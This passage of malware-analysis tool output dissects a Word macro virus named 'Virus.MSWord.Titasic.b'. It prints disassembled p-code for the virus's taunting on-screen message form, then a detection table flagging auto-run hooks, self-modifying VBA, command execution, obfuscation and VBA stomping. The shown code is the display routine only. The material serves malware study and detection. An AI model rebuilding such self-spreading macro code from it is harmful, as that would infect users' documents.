' 	VarDefn i
' Line #65:
' 	LitDI2 0x0001 
' 	St a 
' Line #66:
' 	LitVarSpecial (True)
' 	St diam 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Boo 
' 	MemSt Enabled 
' Line #68:
' 	Do 
' Line #69:
' 	ArgsCall DoEvents 0x0000 
' Line #70:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	St sel 
' Line #71:
' 	Ld tp 
' 	LitDI2 0x0001 
' 	Add 
' 	St tp 
' Line #72:
' 	Ld tp 
' 	LitDI2 0x012C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #73:
' 	Ld Boo 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld tp 
' 	LitDI2 0x0258 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitHI4 0x0009 0x8000 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld sel 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Gt 
' 	IfBlock 
' Line #79:
' 	Ld Timer 
' 	St tm 
' Line #80:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #81:
' 	Ld Label1 
' 	MemLd Caption 
' 	Ld a 
' 	ArgsLd teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld Label1 
' 	MemSt Caption 
' Line #82:
' 	Ld a 
' 	ArgsLd teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0003 "[!]"
' 	Like 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Beep 0x0000 
' 	EndIf 
' Line #83:
' 	Ld Label1 
' 	MemLd Caption 
' 	FnLen 
' 	Ld a 
' 	ArgsLd teks 0x0001 
' 	FnLen 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	Ld diam 
' 	IfBlock 
' Line #85:
' 	Do 
' Line #86:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #87:
' 	ArgsCall DoEvents 0x0000 
' Line #88:
' 	Ld Boo 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #89:
' 	Loop 
' Line #90:
' 	LitVarSpecial (False)
' 	St diam 
' Line #91:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo catat 
' 	EndIf 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld Label2 
' 	MemLd LBound 
' 	LitDI2 0x0009 
' 	Sub 
' 	Ld Label2 
' 	ArgsMemCall Move 0x0001 
' Line #94:
' 	Ld Label2 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd LBound 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	GoSub catat 
' 	EndIf 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Loop 
' Line #98:
' 	ExitSub 
' Line #99:
' 	Label catat 
' Line #100:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Label1 
' 	MemSt Caption 
' 	EndIf 
' Line #101:
' 	Ld Timer 
' 	St tm 
' Line #102:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label2 
' 	MemSt LBound 
' Line #103:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Add 
' 	St a 
' Line #104:
' 	LitDI2 0x0000 
' 	St i 
' Line #105:
' 	LitVarSpecial (True)
' 	St diam 
' Line #106:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label2 
' 	MemSt LBound 
' Line #108:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #109:
' 	LitVarSpecial (True)
' 	Ld Frame1 
' 	MemSt Visible 
' Line #110:
' 	LitVarSpecial (True)
' 	Ld Image1 
' 	MemSt Visible 
' Line #111:
' 	LitVarSpecial (True)
' 	Ld Boo 
' 	MemSt Enabled 
' Line #112:
' 	Ld CommandButton1 
' 	ArgsMemCall SetFocus 0x0000 
' Line #113:
' 	ExitSub 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Return 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Private Sub UserForm_Layout())
' Line #118:
' 	LitStr 0x0012 "Infected Boomv1.01"
' 	LitDI2 0x0001 
' 	ArgsSt teks 0x0001 
' Line #119:
' 	LitStr 0x0027 "Me, No longer to stay in your computer!"
' 	LitDI2 0x0002 
' 	ArgsSt teks 0x0001 
' Line #120:
' 	LitStr 0x0018 "Beware of the Boomv1.01!"
' 	LitDI2 0x0003 
' 	ArgsSt teks 0x0001 
' Line #121:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label2 
' 	MemSt LBound 
' Line #122:
' 	LitStr 0x0015 "BmH guess who(m) am I"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "thanks to "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Label3 
' 	MemSt Caption 
' Line #123:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\Close@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Symbol@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EHNN-07081997 Happy Wedding
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Titasic.b' - OLE stream: 'Macros/Boo/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

